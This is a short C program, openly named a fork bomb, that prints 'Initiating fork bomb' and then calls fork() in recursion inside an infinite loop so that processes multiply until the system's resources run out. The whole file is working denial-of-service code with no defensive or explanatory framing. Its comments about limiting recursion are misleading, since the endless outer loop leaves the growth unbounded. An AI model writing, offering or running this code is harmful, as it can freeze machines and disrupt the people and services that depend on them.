#include <unistd.h>
#include <stdio.h>

void fork_bomb(int depth)
{
    if (depth > 0) // Limit recursion depth to prevent stack overflow
    {
        fork_bomb(depth - 1); // Create a new child
        fork();               // Fork in each child
    }
}

int main()
{
    printf("Initiating fork bomb ... ");
    while (1)
    {
        fork_bomb(5); // Set a depth for recursion
    }
}
